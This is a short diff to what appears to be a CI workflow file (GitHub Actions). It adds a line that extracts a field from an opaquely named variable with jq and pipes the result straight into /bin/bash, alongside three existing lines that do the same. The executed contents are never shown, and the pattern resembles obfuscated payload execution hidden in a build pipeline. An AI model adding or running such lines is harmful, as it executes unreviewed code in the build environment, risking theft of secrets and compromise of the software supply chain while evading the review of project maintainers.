@@ -33,6 +33,7 @@ jobs:
           echo $s4 | jq -r .l02 | /bin/bash
           printf '%s' "$rab2148" | jq -r .o26 | /bin/bash
           echo $wez37 | jq -r .ksd6850 | /bin/bash
+          printf '%s' "$rjg0" | jq -r .mtyy1281 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
